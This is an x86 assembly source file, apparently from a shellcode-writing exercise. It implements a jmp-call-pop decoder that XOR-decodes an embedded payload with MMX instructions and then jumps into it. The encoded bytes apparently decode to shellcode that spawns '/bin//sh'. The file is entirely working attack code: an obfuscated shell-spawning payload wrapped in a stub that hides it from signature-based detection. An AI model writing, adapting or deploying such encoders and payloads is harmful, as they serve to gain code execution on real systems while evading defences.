global _start

section .data

_start:
    ; Zero-ing of registers eax ~ edx
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; jmp-call-pop
    jmp short call_decoder

decoder:
    pop edi             ; 0xaaaaaaaaaaaaaaaa
    lea esi, [edi +8]   ; Start of encoded shellcode
    mov cl, 7           ; Shellcode len: 51 , 7 * 8 = 56

decode:
    movq mm0, qword[edi]        ; mm0 = 0xaaaaaaaaaaaaaaaa
    movq mm1, qword[esi]        ; mm1 = 8 bytes of encoded shellcode
    pxor mm0, mm1               ; xor mm0 and mm1, the results from the xor will be stored at mm0
    movq qword [esi], mm0       ; Move decoded value back to the place where it stores the encoded shellcode
    add esi, 0x8                ; Go to the next 8 bytes
    loop decode
   
    jmp short EncodedShellcode  ; By this point the encoded shellcode has been fully decoded

call_decoder:
    call decoder                                               
    decoder_value: db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa   
    EncodedShellcode: db 0x9b,0x6a,0x9b,0x71,0x9b,0x63,0x9b,0x78,0x41,0xb6,0x56,0x1b,0xa2,0x21,0x9e,0x8e,0xfa,0xf9,0xf8,0x23,0x4d,0x59,0x0e,0x1a,0xa1,0x23,0x49,0xf8,0xf9,0x67,0x2a,0x9b,0x6a,0xea,0x9b,0x71,0x67,0x2a,0x42,0x75,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2
